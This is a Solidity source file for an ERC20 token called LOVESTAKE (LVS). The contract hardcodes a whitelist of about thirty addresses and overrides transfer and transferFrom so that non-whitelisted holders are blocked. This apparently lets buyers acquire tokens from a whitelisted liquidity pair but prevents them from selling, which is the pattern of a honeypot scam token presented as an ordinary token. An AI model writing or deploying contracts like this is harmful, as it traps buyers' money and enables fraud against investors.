// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("LOVESTAKE", "LVS") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 1000000000 * 10 ** decimals());
        whiteList[0x8c53ED0d9a0C871aE576F099a8A2A62eD88760B3]= true;
        whiteList[0xd25799c8F4Dc9f8884f945ddbBd9Cc74A91D9684]=true;
        whiteList[0x3528E0BEDf3756D1E8E57b0f178aEbf8A8A798c1]=true;
        whiteList[0xC261Cf9762701A3f566D811EC13908BEE5C08acB]=true;
        whiteList[0x70B8A2bA26FC3f843596f9B2D9F0E6e6e216A25D]=true;
        whiteList[0xc360d66dB47557F143201323b1ef3dad2c85e43E]=true;
        whiteList[0x64dbe8584262f35b263f321F767FBa021AD247aD]=true;
        whiteList[0x748d25f8fA35034852895b748e34f574977bED1e]=true;
        whiteList[0x8312520592202252C3744689d2414083eA27Cd64]=true;
        whiteList[0xebDA43Bb915eB0606F86a452F81343B797dEC989]=true;
        whiteList[0xCF4ddcffE1aE30d4c7af06d2D92232FE621bF0d6]=true;
        whiteList[0xa45768f9F031944331A319b90d74B07FBc61f47a]=true;
        whiteList[0x585BFC81171eC150B45C6D628725f37A31652919]=true;
        whiteList[0xbAfcA39C8441D6D19e1053F6221EdD5EC81D7F91]=true;
        whiteList[0xb51c1bd800C179B766fF7b44A1FBf62a0cF82146]=true;
        whiteList[0xa471038ebf718F6581663C0C9B6A50d9516F923c]=true;
        whiteList[0x330Dc10a74271BE8FfA2D50C8EaB05ACB5D623F5]=true;
        whiteList[0x1564C37F2ed8cf8F221C1D13D1B09719F342e91B]=true;
        whiteList[0x974F3fdaB9532E50A77F9D4496f124ea6F6175b2]=true;
        whiteList[0xA404537B712dBf136eA119405be0bCfCaa5aa7fC]=true;
        whiteList[0x89429059f91CFa9a1D06d31001363c2EAAEDA92E]=true;
        whiteList[0x9177437495c23a257b83C905122cCf5fcD00289B]=true;
        whiteList[0x1c1D6a2598850D778e49d7E5bA66573d0484C257]=true;
        whiteList[0xd619098f89E8575E4a9b3f4254f099aBd8a8E306]=true;
        whiteList[0xfA704238093F6dEF7e586bEd9fe4B5f47D84B09a]=true;
        whiteList[0x1293928cc44649A00ecAFD0d094A6D72c9FE8539]=true;
        whiteList[0xdffb916D939233F69d3CeaFA45b66151AC2A4853]=true;
        whiteList[0x3b464F8a134E5DB5Ad1AA33B70a063E46DF5BcF1]=true;
        whiteList[0x76a00a3A51b8Ecfe848b9fa970627e7780856768]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}